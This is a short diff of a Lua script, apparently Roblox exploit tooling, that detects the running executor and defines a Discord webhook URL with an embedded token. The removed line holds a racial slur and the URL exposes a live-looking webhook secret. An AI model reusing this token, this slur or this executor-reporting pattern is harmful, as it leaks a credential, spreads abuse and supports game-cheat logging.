@@ -3,7 +3,7 @@ local webhookcheck =
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
-   "nigga with trash exploit"
+   "trash exploit"
 
 local url =
    "https://discord.com/api/webhooks/1161007016052002886/2JoWF3i8ZalEHxCfMA7bSmckCuctTmy7os-87P2FBrZQpRsF9UFNxEKooU2kwbFCTdCp"
